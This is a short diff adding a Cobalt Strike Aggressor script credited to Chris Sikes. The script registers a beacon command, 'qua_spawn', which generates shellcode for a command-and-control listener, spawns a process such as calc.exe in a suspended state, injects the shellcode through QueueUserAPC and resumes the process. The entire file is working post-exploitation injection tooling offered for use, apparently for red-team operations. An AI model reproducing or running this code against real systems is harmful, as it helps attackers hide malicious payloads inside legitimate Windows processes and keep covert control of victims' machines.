@@ -1,0 +1,49 @@
+# Chris Sikes
+# Apr 2021
+# $1 = beacon ID
+# $2 = process
+# x86_64-w64-mingw32-gcc -c qua_spawn.c -o qua_spawn.o
+
+
+alias qua_spawn {
+	local('$bid $handle $data $path $listener $payload');
+
+	# check our arguments
+	if (size(@_) != 3) {
+		berror($1, "qua_spawn: not enough arguments. Enter the Path to Exe and Listener");
+		return;
+	}
+
+	# parse our arguments
+	$path	= $2;
+	$listener = $3;
+
+	# read in our BOF file...
+	$handle = openf(script_resource("qua_spawn.o"));
+	$data	= readb($handle, -1);
+	closef($handle);
+
+	if (listener_info($3) is $null)
+	{
+		berror($1, "Listener $3 is not found");
+	}
+	else
+	{
+    		# Generate a new payload 
+    		$payload = payload($3, "x64", "process");
+		$handle2 = openf(">out.bin");
+		writeb($handle2, $payload);
+		closef($handle2);
+   
+		# pack our arguments
+		$args	= bof_pack($1, "zb", $path, $payload);
+
+		# announce to our user..
+		btask($1, "Injecting into path $2");
+
+		# run a BOF
+		beacon_inline_execute($1, $data, "go", $args);
+	}
+}
+beacon_command_register("qua_spawn", "QueueUserAPC spawn and inject method", "Synopsis: qua_spawn [path] [listener] \nExample Path: C:\\Windows\\System32\\calc.exe\n\nAsynchronous procedure call to queue a specific thread.\nSpawn, suspend, inject the shellcode, then resume.\n\nGenerated payload is exitfunc process intead of thread, so the spawned process kills itself on exit.");
+
